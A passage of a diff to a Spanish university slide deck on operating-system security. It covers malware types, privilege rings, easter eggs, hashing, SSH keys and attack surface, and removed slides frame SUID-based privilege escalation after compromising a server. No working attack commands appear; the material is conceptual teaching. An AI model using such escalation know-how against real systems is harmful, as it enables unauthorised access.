@@ -1,501 +1,641 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sesión 22: Taxonomía de Amenazas y Escape del Contenedor</title>
-    <style>
-        :root {
-            --bg-dark: #0f172a;
-            --text-light: #f8fafc;
-            --accent: #ef4444; /* Rojo para amenazas */
-            --accent-glow: rgba(239, 68, 68, 0.5);
-            --code-bg: #1e293b;
-            --highlight: #fbbf24;
-            --good: #10b981;
-        }
-
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: var(--bg-dark);
-            color: var(--text-light);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .presentation-container {
-            width: 100vw;
-            height: 56.25vw;
-            max-height: 100vh;
-            max-width: 177.78vh;
-            position: relative;
-            background: radial-gradient(circle at center, #1e293b 0%, #020617 100%);
-            overflow: hidden;
-            box-shadow: 0 0 50px rgba(0,0,0,0.8);
-        }
-
-        .slide {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-            pointer-events: none;
-            display: flex;
-            flex-direction: column;
-            padding: clamp(20px, 4vw, 60px);
-            box-sizing: border-box;
-        }
-
-        .slide.active {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        h1 {
-            font-size: clamp(32px, 4.5vw, 70px);
-            color: var(--highlight);
-            margin-bottom: clamp(10px, 2vw, 30px);
-            border-bottom: 2px solid var(--accent);
-            padding-bottom: 15px;
-        }
-
-        h2 {
-            font-size: clamp(24px, 3vw, 50px);
-            color: var(--text-light);
-            margin-bottom: clamp(10px, 1.5vw, 25px);
-        }
-
-        p, li {
-            font-size: clamp(16px, 2.2vw, 35px);
-            line-height: 1.6;
-            margin-bottom: 15px;
-        }
-
-        ul { margin-left: clamp(20px, 3vw, 40px); }
-
-        .code-block {
-            background-color: var(--code-bg);
-            padding: clamp(15px, 2vw, 30px);
-            border-radius: 8px;
-            font-family: 'Consolas', 'Courier New', monospace;
-            font-size: clamp(14px, 1.8vw, 28px);
-            color: #a78bfa;
-            border-left: 5px solid var(--accent);
-            white-space: pre-wrap;
-        }
-
-        .controls {
-            position: absolute;
-            bottom: clamp(10px, 2vw, 30px);
-            right: clamp(10px, 2vw, 30px);
-            z-index: 100;
-        }
-
-        button {
-            background-color: var(--accent);
-            color: white;
-            border: none;
-            padding: clamp(10px, 1.2vw, 20px) clamp(20px, 2.5vw, 40px);
-            font-size: clamp(14px, 1.8vw, 24px);
-            border-radius: 5px;
-            cursor: pointer;
-            margin-left: 10px;
-            transition: background 0.3s, box-shadow 0.3s;
-        }
-
-        button:hover {
-            background-color: #b91c1c;
-            box-shadow: 0 0 15px var(--accent-glow);
-        }
-
-        .progress-bar {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            height: clamp(3px, 0.5vw, 6px);
-            background-color: var(--highlight);
-            transition: width 0.3s ease;
-            z-index: 99;
-        }
-
-        .diagram-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-grow: 1;
-            margin-top: 20px;
-        }
-
-        .grid-layout {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: clamp(20px, 3vw, 50px);
-            height: 100%;
-        }
-
-        .pulse-danger { animation: pulsar-danger 1.5s infinite; }
-        @keyframes pulsar-danger { 0% { opacity: 0.7; transform: scale(0.98); box-shadow: 0 0 0px var(--accent); } 50% { opacity: 1; transform: scale(1.02); box-shadow: 0 0 20px var(--accent); } 100% { opacity: 0.7; transform: scale(0.98); box-shadow: 0 0 0px var(--accent); } }
-        
-        .box { background: rgba(239, 68, 68, 0.1); border: 2px solid var(--accent); padding: 20px; border-radius: 10px; text-align: center; }
-        .box-good { background: rgba(16, 185, 129, 0.1); border: 2px solid var(--good); padding: 20px; border-radius: 10px; text-align: center; }
-
-    </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>SO · S22 · Taxonomía de Amenazas y Seguridad Ofensiva</title>
+<style>
+:root{
+--az:#015583;--tur:#05ADBC;--txt:#201F4B;--mu:#6b7280;
+--safe-top-cover:clamp(208px,9vh,128px);
+--safe-left-cover:clamp(585px,5.5vw,110px);
+--safe-right-cover:clamp(28px,3vw,72px);
+--safe-bottom-cover:clamp(54px,6vh,92px);
+--safe-top:clamp(100px,9vh,132px);
+--safe-side:clamp(66px,5.5vw,108px);
+--safe-bottom:clamp(52px,6vh,90px);
+}
+body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#fff;}
+.deck{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:clamp(8px,2vw,20px);box-sizing:border-box;}
+.stage{width:min(96vw,calc(90vh*(16/9)));aspect-ratio:16/9;position:relative;}
+.slide{position:absolute;inset:0;display:none;box-shadow:0 12px 36px rgba(0,0,0,.3);overflow:hidden;}
+.slide.active{display:block;}
+.cov{background:url("../img/Portada.png") center/cover no-repeat,#015583;color:#fff;}
+.cnt{background:url("../img/Contenido.png") top left/contain no-repeat,#fff;color:var(--txt);}
+.inn{height:100%;box-sizing:border-box;padding:var(--safe-top) var(--safe-side) var(--safe-bottom);display:flex;flex-direction:column;gap:clamp(8px,.9vw,14px);}
+.cov .inn{padding:var(--safe-top-cover) var(--safe-right-cover) var(--safe-bottom-cover) var(--safe-left-cover);justify-content:center;}
+.ct{flex:1;display:flex;flex-direction:column;gap:clamp(8px,.9vw,14px);min-height:0;overflow:auto;overflow-x:hidden;}
+.hd{color:var(--tur);font-size:clamp(12px,1.1vw,15px);font-weight:800;letter-spacing:.07em;text-transform:uppercase;border-bottom:2px solid var(--tur);padding-bottom:3px;}
+h1{margin:0;font-size:clamp(26px,3.2vw,44px);line-height:1.08;color:#fff;}
+h2{margin:0;font-size:clamp(18px,2vw,28px);line-height:1.15;color:var(--az);}
+h3{margin:0;font-size:clamp(14px,1.5vw,20px);color:var(--az);}
+p{margin:0;font-size:clamp(13px,1.2vw,17px);line-height:1.4;}
+li{font-size:clamp(13px,1.2vw,17px);line-height:1.4;margin-bottom:.5em;}
+ul,ol{margin:0;padding-left:1.2em;}
+.sub{color:#f7df00;font-weight:800;font-size:clamp(16px,1.7vw,22px);margin-top:8px;}
+.nt{color:var(--mu);font-size:clamp(10px,.95vw,13px);line-height:1.35;}
+.cal{background:#f0f9ff;border-left:5px solid var(--tur);padding:clamp(7px,.9vw,11px);border-radius:6px;}
+.caw{background:#fffbe6;border-left:5px solid #e6a817;padding:clamp(7px,.9vw,11px);border-radius:6px;}
+.cad{background:#fef2f2;border-left:5px solid #dc2626;padding:clamp(7px,.9vw,11px);border-radius:6px;}
+.tc{display:grid;grid-template-columns:1.1fr .9fr;gap:clamp(10px,1.4vw,20px);align-items:start;min-height:0;}
+.tce{display:grid;grid-template-columns:1fr 1fr;gap:clamp(10px,1.4vw,20px);align-items:start;}
+.crd{background:#f8faff;border:1px solid #dde2f1;border-radius:8px;padding:clamp(8px,.9vw,12px);}
+.cod{font-family:ui-monospace,monospace;font-size:clamp(10px,.9vw,12.5px);line-height:1.5;background:#0b1020;color:#e5e7eb;border-radius:7px;padding:clamp(7px,.9vw,11px);white-space:pre-wrap;border:1px solid #1f2937;max-height:min(36vh,320px);overflow:auto;}
+.cm{color:#6b7280;}.cc{color:#7dd3fc;font-weight:bold;}.cs{color:#86efac;}
+.cn{color:#fde68a;}.cf{color:#c4b5fd;}
+.iw{width:100%;border-radius:7px;border:1px solid #dde2f1;background:#fff;display:flex;align-items:center;justify-content:center;overflow:hidden;}
+table{width:100%;border-collapse:collapse;font-size:clamp(10px,.95vw,13px);}
+th,td{border:1px solid #dde2f1;padding:clamp(4px,.7vw,8px);color:var(--txt);vertical-align:top;}
+th{background:#f3f6fb;text-transform:uppercase;font-size:clamp(9px,.85vw,11px);letter-spacing:.05em;color:var(--az);}
+.ft{display:flex;justify-content:space-between;align-items:center;padding-top:3px;border-top:1px solid #dde2f1;}
+.cov .ft{border-top:1px solid rgba(255,255,255,.15);margin-top:auto;}
+.ctr{font-weight:800;color:var(--az);font-size:clamp(11px,.95vw,13px);}
+.cov .ctr{color:#e5edf8;}
+.tnv{position:absolute;top:50%;left:0;right:0;transform:translateY(-50%);display:flex;justify-content:space-between;padding:0 8px;pointer-events:none;z-index:10;}
+.tnv button{pointer-events:auto;width:38px;height:38px;border-radius:50%;border:1px solid rgba(221,226,241,.9);background:rgba(255,255,255,.9);color:var(--txt);font-weight:900;cursor:pointer;box-shadow:0 4px 14px rgba(0,0,0,.1);}
+#tnv{opacity:0;transition:.15s;}
+.stage:hover #tnv{opacity:1;}
+@media(hover:none){#tnv{opacity:1;}}
+.sq{opacity:0;transform:translateY(9px);transition:opacity .32s,transform .32s;}
+.sq.vs{opacity:1;transform:translateY(0);}
+/* anillo SVG — color por zona */
+.ring-r0{fill:#dc2626;}
+.ring-r3{fill:#1e3a5f;}
+</style>
 </head>
 <body>
+<div class="deck"><div class="stage" id="stage">
 
-<div class="presentation-container">
+<!-- Slide 1 · Portada -->
+<section class="slide cov active">
+<div class="inn"><div class="ct" style="justify-content:center;">
+<span class="hd">Sistemas Operativos · Unidad 3</span>
+<h1>Sesión 22</h1>
+<h1>Taxonomía de Amenazas<br>y Seguridad Ofensiva</h1>
+<div class="sub">Malware · Easter Eggs · Criptografía · Privilege Escalation</div>
+<div class="cal" style="max-width:78%;margin-top:clamp(10px,1.4vw,18px);">
+<p style="color:var(--txt);">Clasificación formal del software malicioso, fundamentos de criptografía aplicada y anatomía técnica de un Container Breakout: el camino desde Ring 3 hasta Ring 0 cuando la configuración falla.</p>
+</div>
+<p class="nt" style="margin-top:auto;color:#201F4B;font-weight:bold;">&larr; &rarr; navegación · F pantalla completa</p>
+</div>
+<div class="ft"><span class="nt" style="color:#e5edf8;">I.U. Pascual Bravo · Ing. de Sistemas</span><span class="ctr">1 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 1 -->
-    <div class="slide active">
-        <h1 style="text-align:center; font-size: 6vw; margin-top: 15%; border: none;">Sesión 22:<br>Taxonomía de Amenazas y Escape del Contenedor</h1>
-        <p style="text-align:center; color: var(--highlight);">Vulnerando el aislamiento desde Ring 3 hasta Ring 0</p>
-    </div>
+<!-- Slide 2 · Propósito técnico -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Propósito técnico de la sesión</div>
+<div class="ct tc">
+<div>
+<h2>Qué dominaremos hoy</h2>
+<ul>
+<li>Clasificar software malicioso por <strong>mecanismo de propagación</strong> y objetivo.</li>
+<li>Distinguir rootkits, easter eggs y su impacto en la integridad del sistema.</li>
+<li>Entender los tres pilares de la criptografía: <strong>hash, cifrado simétrico y asimétrico</strong>.</li>
+<li>Comprender los <strong>Anillos de Privilegio x86</strong> y por qué todo ataque busca Ring 0.</li>
+<li>Analizar un <strong>Container Breakout</strong> completo: docker socket y flag <code>--privileged</code>.</li>
+</ul>
+</div>
+<div class="crd">
+<p><strong>Resultado observable</strong></p>
+<p>Al finalizar, el estudiante podrá explicar la cadena de ataque desde un contenedor comprometido hasta el host real, identificar vectores de escalamiento y nombrar las mitigaciones técnicas correspondientes.</p>
+</div>
+</div>
+<div class="ft"><span class="nt">Propósito · Sesión 22</span><span class="ctr">2 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 2 -->
-    <div class="slide">
-        <h1>Objetivos de la Sesión</h1>
-        <ul>
-            <li>Definir la taxonomía moderna de amenazas orientada al Kernel y demonios de sistema.</li>
-            <li>Entender los Anillos de Privilegios (Rings) de procesadores x86.</li>
-            <li>Identificar la anatomía de un "Container Breakout" (Escape del contenedor).</li>
-            <li>Comprender los riesgos críticos del montaje de sockets y permisos SUID.</li>
-            <li>Ejecutar prácticas controladas de escalamiento de privilegios local.</li>
-        </ul>
-    </div>
+<!-- Slide 3 · Activación base -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Activación de conocimiento base</div>
+<div class="ct tc">
+<div>
+<h2>La Jaula Dorada de S21</h2>
+<ul>
+<li>En S21 vimos que los contenedores aíslan procesos con <strong>Namespaces</strong> y limitan recursos con <strong>Cgroups</strong>.</li>
+<li>A diferencia de las VMs (Hypervisor intermedio), los contenedores hablan <strong>directamente con el Kernel del host</strong>.</li>
+<li>El Kernel es compartido — no hay frontera de hardware que proteja al servidor físico.</li>
+</ul>
+</div>
+<div class="cad">
+<p><strong>El peligro latente</strong></p>
+<p>Si el aislamiento se fractura, no hay intermediario. Un proceso que escapa del contenedor llega al hardware real con la capacidad de hacer lo que el kernel le permita.</p>
+</div>
+</div>
+<div class="ft"><span class="nt">Activación · Sesión 22</span><span class="ctr">3 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 3 -->
-    <div class="slide">
-        <h1>Recapitulación S21: La Jaula Dorada</h1>
-        <div class="grid-layout">
-            <div>
-                <p>En la S21 vimos cómo los contenedores aíslan procesos usando <strong>Namespaces</strong> y los limitan usando <strong>Cgroups</strong>.</p>
-                <p>A diferencia de las VMs (que tienen un Hypervisor intermedio), los contenedores hablan DIRECTO con el Kernel del Host real.</p>
-            </div>
-            <div class="box pulse-danger">
-                <h3>El Peligro Latente</h3>
-                <p>Si un contenedor es burlado y obtiene acceso directo nivel-Kernel, no hay intermediarios que protejan al servidor físico.</p>
-            </div>
-        </div>
-    </div>
+<!-- Slide 4 · Taxonomía malware A -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual A · Taxonomía de software malicioso</div>
+<div class="ct">
+<h2>Clasificación por mecanismo de propagación</h2>
+<p>No todo código dañino es igual. La industria los distingue por <em>cómo se propagan</em> y <em>qué hacen cuando llegan</em>:</p>
+<table>
+<tr><th>Tipo</th><th>Propagación</th><th>Objetivo primario</th></tr>
+<tr class="sq"><td><strong>Virus</strong></td><td>Se adhiere a un archivo legítimo; requiere que el usuario ejecute el huésped</td><td>Replicarse y ejecutar payload oculto</td></tr>
+<tr class="sq"><td><strong>Gusano (Worm)</strong></td><td>Autónomo por red; explota servicios expuestos sin acción del usuario</td><td>Propagación masiva y consumo de recursos</td></tr>
+<tr class="sq"><td><strong>Troyano</strong></td><td>El usuario lo instala creyendo que es software legítimo</td><td>Backdoor, robo de credenciales</td></tr>
+<tr class="sq"><td><strong>Ransomware</strong></td><td>Combinada (phishing + worm en red)</td><td>Cifrar archivos y exigir rescate</td></tr>
+</table>
+</div>
+<div class="ft"><span class="nt">Taxonomía · Sesión 22</span><span class="ctr">4 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 4 -->
-    <div class="slide">
-        <h1>Superficie de Ataque (Attack Surface)</h1>
-        <p>No se ataca un sistema "por arte de magia". Se mapea su superficie de ataque:</p>
-        <ul>
-            <li><strong>Vectores de Red:</strong> Puertos expuestos al exterior (22 SSH, 80 HTTP).</li>
-            <li><strong>Bibliotecas desfasadas:</strong> Código con vulnerabilidades conocidas ejecutándose en memoria.</li>
-            <li><strong>Mala Configuración:</strong> Permisos excesivos otorgados a usuarios por error del administrador (Configuración por Defecto).</li>
-            <li><strong>El Motor de Virtualización:</strong> El dockerd o el kubelet. Si el orquestador es vulnerable, todos sus hijos caen.</li>
-        </ul>
-    </div>
+<!-- Slide 5 · Rootkits y Spyware -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual A · Amenazas de bajo nivel</div>
+<div class="ct tce">
+<div class="crd sq">
+<h3>Rootkit</h3>
+<p style="margin-top:.5em;">Malware diseñado para operar en <strong>Ring 0 (Kernel)</strong>. Puede falsificar la salida de <code>ps</code>, <code>ls</code> y los antivirus porque se ejecuta <em>debajo</em> de ellos. Una vez instalado, el sistema no es de fiar: toda información que entregue puede ser manipulada.</p>
+<p style="margin-top:.6em;" class="nt">Primer uso — <strong>Ring 0:</strong> zona del procesador donde corre el kernel con acceso total al hardware.</p>
+</div>
+<div class="crd sq">
+<h3>Spyware / Keylogger</h3>
+<p style="margin-top:.5em;">Opera en Ring 3 (espacio de usuario) con permisos de lectura amplios. Registra teclas, capturas de pantalla y credenciales, enviándolas a un servidor externo de Command &amp; Control (C2). No necesita escalar privilegios para ser devastador.</p>
+<p style="margin-top:.6em;" class="nt">Primer uso — <strong>Ring 3:</strong> zona donde corren aplicaciones ordinarias, sin acceso directo al hardware.</p>
+</div>
+</div>
+<div class="ft"><span class="nt">Amenazas de bajo nivel · Sesión 22</span><span class="ctr">5 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 5 -->
-    <div class="slide">
-        <h1>Anillos de Privilegio x86 (Privilege Rings)</h1>
-        <div class="diagram-container">
-            <svg width="100%" height="90%" viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg">
-                <!-- Ring 3 -->
-                <circle cx="400" cy="200" r="180" fill="#1e293b" stroke="#3b82f6" stroke-width="4"/>
-                <text x="400" y="70" fill="#f8fafc" text-anchor="middle" font-size="20">Ring 3: User Space (Aplicaciones, Contenedores)</text>
-                
-                <!-- Ring 2/1 -->
-                <circle cx="400" cy="200" r="120" fill="#334155" stroke="#f59e0b" stroke-width="4" stroke-dasharray="10,5"/>
-                <text x="400" y="125" fill="#f8fafc" text-anchor="middle" font-size="16">Ring 1-2: Device Drivers (Casi en desuso)</text>
+<!-- Slide 6 · Visual A — Anillos de privilegio -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Recurso visual A · Anillos de privilegio x86</div>
+<div class="ct" style="align-items:center;">
+<div class="iw" style="flex:1;max-height:78%;">
+<svg viewBox="0 0 640 360" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg" font-family="Arial,sans-serif">
+  <!-- Ring 3 -->
+  <circle cx="320" cy="180" r="160" fill="#e8f4fb" stroke="#015583" stroke-width="3"/>
+  <text x="320" y="40" text-anchor="middle" font-size="14" fill="#015583" font-weight="bold">Ring 3 — User Space</text>
+  <text x="320" y="57" text-anchor="middle" font-size="12" fill="#6b7280">Aplicaciones, contenedores, procesos ordinarios</text>
+  <!-- Ring 1-2 -->
+  <circle cx="320" cy="180" r="110" fill="#dbeafe" stroke="#3b82f6" stroke-width="2" stroke-dasharray="8,4"/>
+  <text x="320" y="100" text-anchor="middle" font-size="12" fill="#3b82f6">Ring 1–2 · Device drivers (casi en desuso)</text>
+  <!-- Ring 0 -->
+  <circle cx="320" cy="180" r="62" fill="#dc2626" stroke="#991b1b" stroke-width="3"/>
+  <text x="320" y="176" text-anchor="middle" font-size="16" fill="#fff" font-weight="bold">Ring 0</text>
+  <text x="320" y="195" text-anchor="middle" font-size="13" fill="#fecaca">Kernel Space</text>
+  <!-- Flecha de ataque -->
+  <path d="M 460 30 Q 430 110 390 165" fill="none" stroke="#e6a817" stroke-width="3" marker-end="url(#arr)"/>
+  <text x="470" y="24" font-size="13" fill="#e6a817" font-weight="bold">Privilege Escalation</text>
+  <defs>
+    <marker id="arr" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="5" markerHeight="5" orient="auto">
+      <path d="M0,0 L10,5 L0,10 z" fill="#e6a817"/>
+    </marker>
+  </defs>
+</svg>
+</div>
+<p class="nt" style="text-align:center;">Todo ataque moderno busca saltar de Ring 3 a Ring 0 — donde el código tiene control absoluto sobre hardware, memoria y red.</p>
+</div>
+<div class="ft"><span class="nt">Anillos de privilegio · Sesión 22</span><span class="ctr">6 / 22</span></div>
+</div>
+</section>
 
-                <!-- Ring 0 -->
-                <circle cx="400" cy="200" r="70" fill="#ef4444" stroke="#dc2626" stroke-width="4"/>
-                <text x="400" y="200" fill="#f8fafc" text-anchor="middle" font-size="22" font-weight="bold">Ring 0</text>
-                <text x="400" y="225" fill="#f8fafc" text-anchor="middle" font-size="18" font-weight="bold">Kernel Space</text>
-                
-                <!-- Attack Vector -->
-                <path d="M 400 40 Q 450 150 480 200" fill="none" stroke="#fbbf24" stroke-width="4" marker-end="url(#arrow)"/>
-                <defs>
-                    <marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto">
-                        <path d="M 0 0 L 10 5 L 0 10 z" fill="#fbbf24" />
-                    </marker>
-                </defs>
-            </svg>
-        </div>
-    </div>
+<!-- Slide 7 · Easter Eggs -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual B · Easter Eggs en software</div>
+<div class="ct tc">
+<div>
+<h2>Huevos de Pascua: código oculto no auditado</h2>
+<p><strong>Easter Egg:</strong> funcionalidad no documentada introducida deliberadamente por un desarrollador dentro de software legítimo (SO, firmware, aplicación).</p>
+<ul style="margin-top:.6em;">
+<li><strong>Origen:</strong> Atari 1979 — programador escondió su nombre para evadir política de no-créditos.</li>
+<li><strong>Ejemplos:</strong> Juego 3D en Excel 97, simulador de vuelo en Excel 2000, pantallas ocultas en Windows XP.</li>
+<li><strong>Riesgo real:</strong> Si un desarrollador puede ocultar un juego, puede ocultar una <em>backdoor</em>. El código no está auditado, ni probado, ni documentado.</li>
+</ul>
+</div>
+<div class="caw sq">
+<h3>Principio violado</h3>
+<p style="margin-top:.5em;"><strong>Código mínimo necesario:</strong> un sistema seguro no debe contener más código del estrictamente requerido para su función. Todo código adicional es superficie de ataque adicional.</p>
+<p style="margin-top:.6em;">Los Easter Eggs complican auditorías de seguridad y generan responsabilidad legal si son explotados.</p>
+</div>
+</div>
+<div class="ft"><span class="nt">Easter Eggs · Sesión 22</span><span class="ctr">7 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 6 -->
-    <div class="slide">
-        <h1>Entendiendo el Kernel Space (Ring 0)</h1>
-        <p>El código que se ejecuta en <strong>Ring 0</strong> (Kernel Linux / NT) tiene control <strong>absoluto</strong> sobre el voltaje de la placa madre, los discos, la RAM física y la red.</p>
-        <p>Los procesos de usuario (tu navegador, tu script de Python, tu contenedor Docker) viven en <strong>Ring 3</strong>. Tienen estrictamente prohibido tocar el hardware directamente.</p>
-        <h3 style="color:var(--highlight)">Todo ataque moderno busca saltar de Ring 3 a Ring 0 (Privilege Escalation).</h3>
-    </div>
+<!-- Slide 8 · Criptografía fundamentos -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual C · Fundamentos de criptografía</div>
+<div class="ct">
+<h2>Los tres pilares matemáticos de la seguridad moderna</h2>
+<div class="tce" style="margin-top:.4em;">
+<div class="crd sq">
+<h3>Hash (Función de resumen)</h3>
+<p style="margin-top:.4em;">Transforma cualquier dato en una cadena de longitud fija. Es <strong>unidireccional</strong>: no se puede revertir. Un solo bit cambiado produce un hash completamente distinto. Sirve para verificar integridad.</p>
+<p class="nt" style="margin-top:.4em;">Ej: <code>SHA-256</code>, <code>MD5</code> (obsoleto)</p>
+</div>
+<div class="crd sq">
+<h3>Cifrado simétrico</h3>
+<p style="margin-top:.4em;">La misma clave cifra <em>y</em> descifra. Muy rápido. Problema: ¿cómo compartes la clave sin que alguien la intercepte en tránsito?</p>
+<p class="nt" style="margin-top:.4em;">Ej: <code>AES-256</code> — estándar para cifrado en reposo</p>
+</div>
+<div class="crd sq">
+<h3>Cifrado asimétrico</h3>
+<p style="margin-top:.4em;">Par de claves: <strong>pública</strong> (cifrar, compartir libremente) y <strong>privada</strong> (descifrar, nunca compartir). Resuelve el problema del intercambio de claves.</p>
+<p class="nt" style="margin-top:.4em;">Ej: <code>RSA</code>, <code>Ed25519</code> — base de TLS/SSH</p>
+</div>
+</div>
+</div>
+<div class="ft"><span class="nt">Criptografía · Sesión 22</span><span class="ctr">8 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 7 -->
-    <div class="slide">
-        <h1>Taxonomía de Amenazas Subyacentes</h1>
-        <ul>
-            <li><strong>Rootkits:</strong> Malware inyectado en Ring 0. Puede mentirle al comando <code>ps</code> y a los antivirus porque se ejecuta *debajo* de ellos.</li>
-            <li><strong>Buffer Overflows:</strong> Exceder deliberadamente una variable en RAM para reescribir la memoria adyacente y forzar la ejecución de código binario (Shellcode).</li>
-            <li><strong>Zero-Day (0-Day):</strong> Vulnerabilidad de la cual el fabricante del software aún no tiene conocimiento. No existe parche o solución al momento del ataque.</li>
-        </ul>
-    </div>
+<!-- Slide 9 · Visual B — Hash en práctica -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Recurso visual B · Hash: verificación de integridad</div>
+<div class="ct tc">
+<div>
+<h2>¿Por qué publicar el SHA-256 de una ISO?</h2>
+<p>Si un atacante intercepta la descarga e inyecta malware en la imagen, el hash resultante será <strong>completamente diferente</strong>. El receptor detecta la manipulación antes de instalar.</p>
+<div class="cod" style="margin-top:.6em;"><span class="cm"># Verificar integridad en Linux:</span>
+$ sha256sum ubuntu-24.04.iso
+<span class="cm"># Compara con el hash oficial en ubuntu.com</span>
 
-    <!-- Slide 8 -->
-    <div class="slide">
-        <h1>Los CVE (Common Vulnerabilities and Exposures)</h1>
-        <p>Diccionario global de vulnerabilidades mantenido por MITRE.</p>
-        <p>¿Encontraste una forma de crashear el Kernel Linux inyectando un paquete malformado? Lo reportas y se te asigna un código, por ejemplo: <strong>CVE-2022-0492 (Cgroups Breakout)</strong>.</p>
-        <div class="box">
-            <p>Los administradores cruzan la lista semanal de CVEs contra los sistemas de su empresa para emparchar (Actualizar / Hardening) antes de que un atacante lance un script automatizado.</p>
-        </div>
-    </div>
+<span class="cm"># En Windows PowerShell:</span>
+&gt; Get-FileHash ubuntu-24.04.iso -Algorithm SHA256</div>
+</div>
+<div class="crd sq">
+<h3>Propiedad avalanche</h3>
+<p style="margin-top:.5em;">Un solo carácter modificado en el archivo de entrada produce un hash totalmente distinto — no similar, sino <em>radicalmente diferente</em>. Esto hace imposible falsificar un hash sin tener la clave.</p>
+<p style="margin-top:.6em;">Los sistemas operativos verifican hashes de sus propios binarios para detectar rootkits que hayan modificado archivos del sistema.</p>
+</div>
+</div>
+<div class="ft"><span class="nt">Hash en práctica · Sesión 22</span><span class="ctr">9 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 9 -->
-    <div class="slide">
-        <h1>Escalamiento de Privilegios (PrivSec) Local vs Remoto</h1>
-        <div class="grid-layout">
-            <div>
-                <h3 style="color:var(--accent)">Remoto (RCE)</h3>
-                <p>El atacante envía un comando desde internet sin tener usuario en la máquina (Ej. Rompiendo una web en PHP y forzando ejecución desde la IP web).</p>
-            </div>
-            <div>
-                <h3 style="color:var(--highlight)">Local (LPE)</h3>
-                <p>El atacante ya entró al sistema base o al contenedor (quizás era un empleado o vulneró primero la web). Ahora es un usuario común `id=1000 (www-data)`. Su objetivo es convertirse en `id=0 (root)`.</p>
-            </div>
-        </div>
-    </div>
+<!-- Slide 10 · SSH asimétrico -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual C · Cifrado asimétrico aplicado</div>
+<div class="ct tc">
+<div>
+<h2>SSH: autenticación sin contraseña</h2>
+<ul>
+<li>Se genera un par: <code>id_ed25519</code> (privada, solo el usuario) y <code>id_ed25519.pub</code> (pública, se deposita en el servidor).</li>
+<li>El servidor cifra un desafío con la clave pública. Solo la clave privada puede descifrarlo — sin transmitir la contraseña.</li>
+<li>Un atacante que intercepte el canal solo ve texto cifrado ilegible.</li>
+</ul>
+</div>
+<div class="cod sq">
+<span class="cm"># Generar par de claves Ed25519:</span>
+$ ssh-keygen -t ed25519 -C "correo@ejemplo.com"
 
-    <!-- Slide 10 -->
-    <div class="slide">
-        <h1>El concepto crítico de permisos SUID</h1>
-        <p>En Linux (El anfitrión típico de Docker), existe un bit especial llamado <strong>Set Owner User ID up on execution (SUID)</strong>.</p>
-        <p>Si un binario (ej. el comando <code>passwd</code>) tiene el bit SUID activado, significa que cuando un usuario común lo ejecute, <strong>el programa funcionará temporalmente con los permisos del creador del archivo (generalmente Root).</strong></p>
-        <p>Mala configuración = Dejar binarios SUID indebidos, permitiendo que un proceso de usuario adquiera ring level 0 temporalmente y ejecute código malicioso.</p>
-    </div>
+<span class="cm"># Depositar clave pública en el servidor:</span>
+$ ssh-copy-id usuario@servidor.com
 
-    <!-- Slide 11 -->
-    <div class="slide">
-        <h1>Práctica 1: Reconocimiento Manual de SUID</h1>
-        <p>Supongamos que acabamos de comprometer un servidor o contenedor y hemos ganado acceso limitado. El primer paso lógico es buscar archivos que podamos usar en nuestra contra (que tengan SUID root).</p>
-        <div class="code-block">
-# Buscando desde la raíz, ignora errores:
+<span class="cm"># Conectarse sin contraseña:</span>
+$ ssh usuario@servidor.com</div>
+</div>
+<div class="ft"><span class="nt">SSH · Sesión 22</span><span class="ctr">10 / 22</span></div>
+</div>
+</section>
+
+<!-- Slide 11 · Superficie de ataque -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual D · Superficie de ataque</div>
+<div class="ct">
+<h2>Attack Surface: ¿por dónde entra el atacante?</h2>
+<p><strong>Superficie de ataque</strong> es el conjunto de todos los puntos donde un sistema expone funcionalidad al exterior. A mayor superficie, mayor probabilidad de encontrar una vulnerabilidad explotable.</p>
+<div class="tce" style="margin-top:.5em;">
+<div class="crd sq"><h3>Vectores de red</h3><p style="margin-top:.4em;">Puertos expuestos: 22 (SSH), 80/443 (HTTP/S), bases de datos abiertas. Cada servicio escuchando es una puerta potencial.</p></div>
+<div class="crd sq"><h3>Librerías desactualizadas</h3><p style="margin-top:.4em;">Código con CVEs conocidos en memoria. Un atacante que identifique la versión puede usar un exploit público en minutos.</p></div>
+<div class="crd sq"><h3>Mala configuración</h3><p style="margin-top:.4em;">Permisos excesivos asignados por descuido o por defecto. La mayoría de los incidentes reales tienen este origen.</p></div>
